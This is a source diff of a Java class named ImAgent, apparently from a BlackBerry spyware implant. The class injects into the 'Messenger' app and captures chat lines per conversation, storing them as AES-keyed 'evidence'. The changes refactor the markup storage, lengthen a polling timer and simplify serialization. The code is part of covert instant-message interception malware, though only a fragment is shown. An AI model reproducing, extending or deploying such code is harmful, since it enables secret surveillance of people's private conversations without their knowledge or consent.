@@ -15,11 +15,11 @@ import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
 import blackberry.agent.im.Line;
+import blackberry.agent.im.LineMarkup;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.evidence.DictMarkup;
 import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
@@ -38,14 +38,14 @@ public final class ImAgent extends Agent implements BacklightObserver,
     static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
     //#endif
 
-    private static final long APP_TIMER_PERIOD = 3000;
+    private static final long APP_TIMER_PERIOD = 5000;
 
     AppInjector appInjector;
     //boolean infected;
 
     String appName = "Messenger";
 
-    DictMarkup markup;
+    LineMarkup markup;
 
     /**
      * Instantiates a new task agents
@@ -77,7 +77,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         setPeriod(APP_TIMER_PERIOD);
         setDelay(APP_TIMER_PERIOD);
 
-        markup = new DictMarkup(agentId, Encryption.getKeys().getAesKey());
+        markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());
 
     }
 
@@ -85,16 +85,15 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#ifdef DEBUG
         debug.trace("unserialize");
         //#endif
-        if (markup.isMarkup()) {
 
-            byte[] lineSer = markup.get(partecipants);
-            if (lineSer != null) {
-                Line lastLine = Line.unserialize(lineSer);
-                //#ifdef DEBUG
-                debug.trace("unserialize: " + lastLine);
-                //#endif
-                return lastLine;
-            }
+        if (markup.isMarkup()) {
+            Line lastLine = markup.getLine(partecipants);
+
+            //#ifdef DEBUG
+            debug.trace("unserialize: " + lastLine);
+            //#endif
+            return lastLine;
+
         }
         return null;
     }
@@ -104,17 +103,11 @@ public final class ImAgent extends Agent implements BacklightObserver,
         debug.trace("serialize: " + lastLine);
         //#endif
 
-        byte[] data = lastLine.serialize();
-
-        //#ifdef DEBUG
-        debug.trace("serialize: " + Utils.byteArrayToHex(data));
-        //#endif
-
         if (!markup.isMarkup()) {
             markup.createEmptyMarkup();
         }
 
-        markup.put(partecipants, data);
+        markup.put(partecipants, lastLine);
     }
 
     public static ImAgent getInstance() {
@@ -139,7 +132,6 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-
     }
 
     public synchronized void actualStop() {
@@ -218,7 +210,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
         }
     }
 
-    public synchronized void add(String partecipants, Vector lines) {
+    public void add(String partecipants, Vector lines) {
         if (lines == null) {
             //#ifdef DEBUG
             debug.error("add: null lines");
